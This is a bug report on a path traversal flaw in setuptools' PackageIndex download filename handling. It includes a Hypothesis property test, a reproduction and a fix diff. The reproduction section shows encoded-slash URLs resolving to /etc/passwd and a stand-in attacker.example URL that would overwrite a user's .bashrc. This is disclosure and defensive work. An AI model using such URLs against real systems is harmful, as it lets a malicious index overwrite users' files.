# Bug Report: setuptools.package_index PackageIndex.download writes outside tmpdir via percent-encoded "/" in URL

**Target**: `setuptools.package_index.PackageIndex._resolve_download_filename` (used by `PackageIndex.download` / `_download_url`)
**Severity**: High
**Bug Type**: Logic
**Date**: 2026-10-28

## Summary

The download filename is taken from the *percent-unquoted* last URL path segment and joined onto `tmpdir`. An encoded slash (`%2F`) becomes a real path separator, so a URL like `https://host/%2Fetc%2Fpasswd` resolves to `/etc/passwd`, and the downloaded body is written there. This breaks the documented promise that a URL "is downloaded to a subpath of `tmpdir`" (arbitrary file write, CVE-2025-47273).

## Property-Based Test

```python
import os
from hypothesis import given, settings, assume, strategies as st
from setuptools.package_index import PackageIndex

TMP = "/tmp/pkgidx_dl"
resolve = PackageIndex._resolve_download_filename
seg_tokens = st.sampled_from(["a", "b", ".", "..", "%2F", "%2f", "%5C", "\\", "%2E", "x.tar.gz", "-1.0"])
segment = st.lists(seg_tokens, min_size=1, max_size=8).map("".join)

@settings(max_examples=2000)
@given(dirs=st.lists(st.sampled_from(["pkgs", "a", "b"]), max_size=3), last=segment)
def test_download_stays_in_tmpdir(dirs, last):
    """CLAIM-1: download target is directly inside tmpdir."""
    url = "https://example.com/" + "/".join(dirs + [last])
    path = os.path.abspath(resolve(url, TMP))
    assume(path != os.path.abspath(TMP))
    assert os.path.dirname(path) == os.path.abspath(TMP), (url, path)
```

**Failing input**: `dirs=[], last='%2F'` (URL `https://example.com/%2F` -> `/`)

## Reproducing the Bug

```python
from setuptools.package_index import PackageIndex

print(PackageIndex._resolve_download_filename("https://example.com/%2Fetc%2Fpasswd", "/tmp/dl"))
print(PackageIndex._resolve_download_filename("https://example.com/sub%2Fx.tar.gz", "/tmp/dl"))
```

Output:
```
/etc/passwd
/tmp/dl/sub/x.tar.gz
```

`PackageIndex().download("https://attacker.example/%2Fhome%2Fuser%2F.bashrc", tmpdir)` then opens that path with `open(filename, 'wb')` in `_download_to` and writes the server's response to it.

## Why This Is A Bug

`PackageIndex.download`'s docstring says: "If `spec` is a URL, it is downloaded to a subpath of `tmpdir`". The `while '..' in name` loop shows the author meant to stop path escapes, but it misses absolute paths. `os.path.join(tmpdir, "/etc/passwd")` throws `tmpdir` away. URLs reach this code from package index pages and `--find-links`, so a malicious index or page can overwrite any file the user can write to.

## Fix

```diff
     @staticmethod
     def _resolve_download_filename(url, tmpdir):
@@
         if name.endswith('.egg.zip'):
             name = name[:-4]  # strip the extra .zip before download
 
-        return os.path.join(tmpdir, name)
+        filename = os.path.join(tmpdir, name)
+
+        # ensure path resolves within the tmpdir
+        if not filename.startswith(str(tmpdir)):
+            raise ValueError(f"Invalid filename {filename}")
+
+        return filename
```
